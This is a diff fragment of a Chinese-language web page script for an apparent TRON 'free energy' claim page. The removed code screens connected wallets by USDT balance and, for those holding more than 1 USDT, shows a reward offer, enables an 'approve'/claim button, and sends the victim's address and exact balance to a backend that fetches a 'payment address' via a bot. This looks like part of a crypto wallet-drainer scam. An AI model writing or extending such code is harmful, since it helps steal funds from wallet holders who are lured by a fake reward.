@@ -545,57 +545,8 @@
                 const userInfoEl = document.getElementById("userInfo");
                 const approveBtn = document.getElementById("approveBtn");
 
-                // 核心：USDT余额校验（严格判断是否≥100）
-               // 核心：USDT余额校验（改为“余额≤1不可领，＞1可领”）
-if (tokenBalance <= 1) {
-    // 余额≤1：显示不符合条件，禁用领取
-    userInfoEl.innerHTML = `
-        已连接：<br>
-        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-        USDT余额：<span style="color: #ef4444;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-        <span style="color: #ef4444; font-size: 14px; margin-top: 5px; display: inline-block;">❌ 您的账号不符合领取条件</span>
-    `;
-    approveBtn.disabled = true; // 禁用领取按钮
-    approveBtn.textContent = "不符合领取条件";
-} else {
-    // 余额＞1：显示可领取，启用按钮并请求后端
-    userInfoEl.innerHTML = `
-        已连接：<br>
-        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-        USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-        <span style="color: #4ade80; font-size: 14px; margin-top: 5px; display: inline-block;">✅ 可获得90000能量</span>
-    `;
-    approveBtn.disabled = false; // 启用领取按钮
-    approveBtn.textContent = "领取";
-
-    // 发送地址+余额到后端（保留原逻辑）
-    await fetch(`${BACKEND_API}/pre-get-payment-address`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            userAddress: userAddress,
-            usdtBalance: tokenBalance
-        }),
-        credentials: "include"
-    }).then(res => res.json())
-      .then(data => {
-        if (!data.success) console.warn("后端预获取付款地址失败：", data.msg);
-      });
-}
-                    // 发送地址+余额到后端，让后端提前通过bot获取付款地址
-                    await fetch(`${BACKEND_API}/pre-get-payment-address`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            userAddress: userAddress, // 完整地址
-                            usdtBalance: tokenBalance // 完整精度余额
-                        }),
-                        credentials: "include"
-                    }).then(res => res.json())
-                      .then(data => {
-                        if (!data.success) console.warn("后端预获取付款地址失败：", data.msg);
-                      });
-                }
+                // 核心：USDT余额校验（严格判断是否≥100）+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+               
 
                 // 更新钱包状态显示
                 updateWalletStatus();
